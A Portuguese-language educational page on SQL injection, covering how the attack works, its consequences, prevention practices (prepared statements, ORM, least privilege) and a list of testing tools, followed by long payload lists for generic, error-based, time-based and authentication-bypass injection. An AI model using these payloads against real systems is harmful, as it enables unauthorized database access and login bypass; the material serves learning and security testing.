# SQL Injection - Sobre

![SQL Injection](https://img.ibxk.com.br/2017/01/05/05165308261866.jpg?ims=328x)

Neste documento, você aprenderá o que é SQL Injection, como ele funciona, as potenciais consequências e, o mais importante, como se proteger contra esse tipo de ataque.

## O que é SQL Injection?

**SQL Injection** é uma forma de ataque cibernético que visa explorar falhas de segurança em aplicações web que interagem com bancos de dados usando SQL (Structured Query Language). Essa técnica permite que um invasor execute comandos SQL maliciosos por meio de entradas não sanitizadas em formulários, parâmetros de URL ou outras interfaces de entrada de dados.

## Como funciona?

Normalmente, as aplicações web usam consultas SQL para interagir com bancos de dados e recuperar informações. Um ataque de SQL Injection ocorre quando um invasor insere deliberadamente instruções SQL maliciosas em campos de entrada. Essas instruções são então executadas no banco de dados, permitindo que o atacante acesse, modifique ou exclua dados.

Exemplo de uma consulta SQL simples:

```
SELECT nome, email FROM usuarios WHERE id = '$id';
```

Exemplo de ataque de SQL Injection:

Suponha que o campo de entrada seja:

```
$id = '1' OR '1' = '1'
```

A consulta modificada se tornaria:

```
SELECT nome, email FROM usuarios WHERE id = '1' OR '1' = '1';
```

Isso retornaria todos os registros da tabela usuarios, pois a condição '1' = '1' é sempre verdadeira.

## Consequências do SQL Injection

Os ataques de SQL Injection podem ter várias consequências prejudiciais:
<ul>
  <li>
    Acesso não autorizado: Um invasor pode obter acesso a informações confidenciais, como senhas, dados financeiros e informações pessoais dos usuários.
  </li>
  <li>
    Modificação de dados: Um atacante pode alterar, adicionar ou excluir dados no banco de dados, causando danos irreparáveis aos sistemas e à integridade dos dados.
  </li>
  <li>
    Execução de comandos arbitrários: Os atacantes podem executar comandos SQL arbitrários, o que pode levar a ações maliciosas no sistema, como criação de contas de usuário falsas ou desativação do sistema.
  </li>
</ul>

## Prevenção de SQL Injection

Aqui estão algumas práticas recomendadas para prevenir ataques de SQL Injection:
<ul>
  <li>
   Validação e sanitização de entrada: Sempre valide e sanitize as entradas do usuário antes de usar em consultas SQL.
  </li>
  <li>
    Usar Prepared Statements: Use Prepared Statements (também chamados de parameterized queries) que parametrizam as consultas SQL, separando os dados dos comandos SQL.
  </li>
  <li>
    Utilizar ORM: Se possível, utilize ORM (Object-Relational Mapping) que trata automaticamente a geração de consultas SQL.
  </li>
  <li>
    Princípio do Menor Privilégio: Certifique-se de que as permissões do banco de dados sejam as mínimas necessárias para as operações.
  </li>
  <li>
     Atualizações e patches: Mantenha seus sistemas atualizados com as últimas correções de segurança.
  </li>
</ul>

## Ferramentas para Detecção de Vulnerabilidades de SQL Injection:

* [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatização de Injeção de SQL e Ferramenta de Extração de Dados de Bancos de Dados

* [BBQSQL](https://github.com/Neohapsis/bbqsql) – Uma Ferramenta para Exploração de Injeção de SQL Baseada em Cegueira

* [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automação de Ataques a Bancos de Dados NoSQL

* [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – Scanner de Vulnerabilidades de SQL

* [DSSS](https://github.com/stamparm/DSSS) – Scanner para Identificação de Vulnerabilidades de Injeção de SQL

* [explo](https://github.com/dtag-dev-sec/explo) – Formato de Teste de Vulnerabilidade para Web Legível por Humanos e Máquinas

* [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Exploração de Injeção de SQL Baseada em Cegueira via Bitshifting

* [Leviathan](https://github.com/leviathan-framework/leviathan) - Conjunto de Ferramentas para Auditoria em Massa Abrangente

* [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploração de Injeção de SQL Baseada em Tempo, Focada em Cabeçalhos HTTP (MySQL/MariaDB)

## Cargas genéricas para injeção de SQL:

```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --

1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

Comentarios:

#
/*
-- -
;%00
`
```

## Cargas genéricas baseadas em erros:

```
 OR 1=1
 OR x=x
 OR x=y
 OR 1=1#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR x=x-- 
 OR x=y-- 

 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='

 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--

 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 31337

 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
 and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'

%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
```

## Cargas genéricas baseadas em tempo para injeção de SQ:

```
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

# Cargas para bypass de autenticação em injeção de SQL

```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
admin' or 1=1
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```
